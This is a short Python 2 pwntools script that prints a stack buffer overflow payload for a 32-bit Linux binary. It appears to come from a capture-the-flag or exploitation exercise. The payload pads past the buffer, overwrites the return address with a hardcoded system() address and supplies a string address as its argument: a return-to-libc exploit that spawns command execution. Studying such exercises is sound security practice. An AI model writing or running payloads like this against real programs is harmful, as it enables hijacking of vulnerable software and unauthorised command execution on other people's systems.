#!/usr/bin/env python2

from pwn import *

context(arch='i386', os='linux')

system_addr = p32(0x08048330)
str_addr = p32(0x8048544)
print 'A' * 0x204 + 'BBBB' + system_addr + 'CCCC' + str_addr
